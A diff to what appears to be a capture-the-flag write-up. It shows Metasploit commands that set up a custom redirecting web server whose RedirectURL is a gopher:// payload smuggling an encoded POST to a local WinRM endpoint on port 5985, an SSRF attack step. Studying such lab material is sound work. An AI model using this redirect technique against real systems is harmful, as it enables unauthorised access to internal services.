@@ -9,7 +9,7 @@ Copying _http_basic.rb_ module to _http_forward.rb_:
 cp /usr/share/metasploit-framework/modules/auxiliary/server/capture/http_basic.rb ~/.msf4/modules/auxiliary/server/capture/http_forward.rb
 ```
 
-The modified code can be found in this repository in [jarmis_metasploit-http-forward.rb](jarmis/jarmis_metasploit-http-forward.rb).
+The modified code can be found in this repository in [jarmis_metasploit-http-forward.rb](jarmis_metasploit-http-forward.rb).
 
 Starting the web server with **Metasploit**:
 ```
@@ -17,7 +17,7 @@ msf6 > use auxiliary/server/capture/http_forward
 
 msf6 auxiliary(server/capture/http_forward) > set SRVPORT 443
 msf6 auxiliary(server/capture/http_forward) > set SRVHOST tun0
-msf6 auxiliary(server/capture/http_forward) > set RedirectURL 'gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20(...)
+msf6 auxiliary(server/capture/http_forward) > set RedirectURL 'gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61(...)
 
 msf6 auxiliary(server/capture/http_forward) > run
 ```
